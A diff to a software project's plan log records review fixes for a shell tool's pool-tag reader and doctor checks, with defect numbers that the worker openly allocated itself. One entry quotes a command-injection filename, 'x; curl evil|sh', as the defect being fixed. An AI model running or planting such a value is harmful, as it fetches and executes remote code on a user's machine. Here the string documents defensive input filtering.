@@ -2765,3 +2765,109 @@ substituted before wave-done.
   away. The same GNU-only claim was also found in two MORE places by the fix — a test's TITLE and
   its comment, both passing on macOS while asserting something false there, because their
   assertions only checked the outcome the two userlands share.
+
+---
+
+#### Fix round 7 — the coordinator's whole-wave review (2026-09-06)
+
+Three independent lenses reviewed the branch at `2a4f5287`; fleet safety returned MERGE with no
+Critical, the other two MERGE-WITH-FIXES. Six must-fix, two folds, one finding refuted, three
+carries. The four below are defects in code **this plan dictated**, so each takes a number.
+**Numbers ISSUED, not requested — a ruling, and the reason is a deadlock.** The brief's protocol
+for an execution-time deviation is `D-TBD-<slug>` plus a `deviation-request` mail for the
+coordinator to mint. But `ccrc-api ledger allocate` is reachable from this workspace, and
+`dtbd.test.ts` reds the tree on any concrete placeholder in a tracked file — so following the
+brief literally would have pushed a branch whose CI could not go green until a sleeping
+coordinator woke, while the same review told this worker to get CI green and report a fresh
+fingerprint. The project's own law resolves it: a number is written only when it was ISSUED, and
+the D-TBD route is conditioned on the allocator being UNREACHABLE (worker clause 11). Allocated as
+one contiguous block against run 33 and defined in the same act: **D-1850..D-1853**, floor now
+1854. Cost if this ruling is wrong: four numbers allocated by the worker rather than the
+coordinator, inside one program — visible in the ledger, and nothing left unissued.
+
+- **D-1850** (fix round 7, Tasks 1 and 8) — the reader's headline contract is that it never
+  blocks, and it had no size bound. `_project_pool_state` was hardened over three rounds against blocking on a FIFO, a
+character device and a symlink to either — a TYPE gate — and then read whatever regular file it
+found straight into a shell variable. Measured by the coordinator: 10 MB took 0.20 s and 32 MB RSS,
+100 MB took 39 s and 979 MB RSS; linear and unbounded. It needs no exotic filesystem to reach —
+`ln -s ~/.cc-sessions/swap.log pools/<p>`, or this branch's own documented alias in the other
+direction, makes every swap-log append grow the tag. Today it stalls `ws-add` under its flock;
+**wave 2b puts this function on the 5-second supervisor tick**, which is why it is fixed in the wave
+that owns the contract rather than the wave that would suffer it. Fixed by `read -r -d '' -n 64 v`
+in both the reader and the doctor's per-tag mirror — 64 is twice the 32-character grammar, so no
+legal tag reaches it, and an over-cap file stops short of EOF, returns 0 from the same branch a NUL
+returns 0 from, and is answered `malformed`: the bytes were readable and are not one legal token.
+**The mutation is detected by the WHITESPACE PAIR, not by size** — measured: a 1 MB junk file
+answers `malformed` with the cap and without it, while `pool-a` + 100 spaces answers `malformed`
+with it and `named pool-a` without. A size test alone would have pinned nothing. One behaviour
+changes for a well-formed name: a tag padded with 58+ characters of trailing whitespace used to
+strip back to `named <n>` and is now `malformed`, which `_pool_ok` maps to "nobody decides".
+
+- **D-1851** (fix round 7, Task 8) — the doctor FAILed a box on which `ccd` works perfectly. The
+dictated `[ ! -d "$dir" ] || [ ! -r "$dir" ] || [ ! -x "$dir" ]` conflated two permissions that
+answer different questions. `_project_pool_state` stats ONE known path and never enumerates, so
+SEARCH (`-x`) is all it needs; LIST (`-r`) is what the doctor needs and the reader never does.
+Measured against the real reader: `pools/` at mode 0111 answers `named pool-a`, at 0444 answers
+`unreadable`. The old test called 0111 `pools-unlistable: … so no project's tag can be read — ccd
+reads this same path`, false in both halves — the cross-file disagreement class this wave keeps
+finding, pointed at the tool an operator consults when nothing else works. Split: `! -d || ! -x`
+stays `pools-unlistable` (FAIL, and the reader agrees); `! -r` alone becomes `pools-unenumerable`
+(WARN — "everything works, nobody can audit it"), a SEVENTH verdict class for this check.
+**Spec §5.4.6 enumerates six and is now short one**; that is a carry, not something this wave edits.
+
+- **D-1852** (fix round 7, Task 8) — a filesystem-derived string was handed to a human inside
+  a copy-pasteable command. A tag file named `x; curl evil|sh` rendered `remedy: clear each: ccd
+project-pool --project x; curl evil|sh --clear`. Not an escalation — writing under `$dir` already
+requires code execution as the same user — but this check's whole value is that what it prints can
+be trusted, and this was the only new place in the wave where a name became a command. Fixed by
+filtering to `_ws_project_valid`'s own charset (`[A-Za-z0-9._-]`, no dot-leading, and no leading
+`-`, which is shell-safe but would be read by `ccd` as a flag), counting the omissions and naming
+the count in the remedy. The MESSAGE is deliberately unfiltered: it is printed, never executed, and
+`_dr_line` already squashes the newline that is the only way to forge a second verdict line. The
+"no name `ccd` would create is omitted" half is a CROSS-FILE claim, so `pool-name-parity.test.ts`
+measures it against `ccd/ccd` rather than trusting the comment.
+
+- **D-1853** (fix round 7, Task 8) — the PASS asserted a check that had been skipped. When
+`~/.ccrc/accounts.sh` cannot be read, `known` is empty and the orphan arm deliberately makes no
+claim; the single dictated PASS sentence asserted the third clause ("names a pool this box's roster
+carries") regardless. That is the same false-PASS shape D-1848's own doctor instance was numbered
+for, one clause down. Fixed by splitting the sentence: with a vocabulary it says all three things,
+without one it says the pool-vocabulary half is UNMEASURED and points at `_check_wrappers`, which
+already reports the unreadable roster with its own remedy.
+
+**D-1848 (extended — the mechanism's own round-7 corrections).** Four defects in the SCAN this wave
+built to enforce D-1848, all of the shape D-1848 is about, found by a reviewer reading the scan
+rather than the code it guards:
+1. **The function-name pattern excluded `-`.** `ccrc-doctor-checks` names four of its own checks
+   with a hyphen (`_check_graphify-path()` at `:3306`; its table lists `graphify-path`), so that
+   function's entire body — and any future `_check_pools-parent()` — sat outside every block the
+   scan built. One character.
+2. **The floor was satisfiable by ONE function.** "At least 2 qualifying sites per file" was met
+   while both `ccd/ccd` hits came from `_project_pool_state` and `cmd_ws_add` and
+   `cmd_project_pool` were covered by nothing. Replaced by an exact pinned SET of sites, plus a
+   second pin naming every pools-relevant function the scan blocked out — so where it LOOKED is
+   asserted, not only what it found.
+3. **The pairing was satisfiable without the semantics.** `-L` "within one line either side" is
+   met by an inert `[[ -L "$f" ]] && :` parked above the test, which decides nothing. The rule is
+   now the SAME STATEMENT, and `ccd/ccd`'s reader was rewritten into that shape
+   (`[[ ! -e "$X" && ! -L "$X" ]]` / `[[ ! -e "$X" && -L "$X" ]]`); the doctor already had it. The
+   residue is stated in the scan's header rather than hidden: this still measures adjacency, not
+   semantics.
+4. **The defer exemption matched a QUOTED mention.** `die "… _project_pool_state …"` is a sentence
+   about the reader, not a call to it, and licensed an unpaired `-e` five lines either side.
+   Quoted contents are now neutralised first, through the same helper the block-finder uses.
+   And the scan now sees the `test` COMMAND, not only bracketed expressions.
+
+**REFUTED, recorded because the refutation is the finding.** A lens reported `[[ -d "$POOLS_DIR" ]]`
+as a live instance of the `-e` class. It is not: the `-e`/`-L` pair above it returns for the
+dangling and looping cases, so `-d` only ever sees a path known to exist. What survives is narrower
+and now sits in the scan's header — **the mechanism enforces `-e` while the function's own comment
+names the same blind spot for `-d`**, so the header must claim `-e` and only `-e`. That is the
+wave's defining defect appearing inside a disclosure for the third time, and the coordinator caught
+it by reading the sequence instead of forwarding the finding.
+
+**Carries out of this round, for the waves that cannot see them.** (a) Wave 3: tagging a project
+with a pool no account is in warns on stderr and exits 0, so under `runCcdOr502` it renders
+`200 {ok:true}` for a tag that stranded a project — the ladder one layer up, and wave 3 must not
+relay the exit code alone. (b) Wave 2b: `_project_pool_state` does not validate its own `$1`,
+latent until 2b's registry-derived caller. (c) Spec §5.4.6's six verdict classes are now seven.
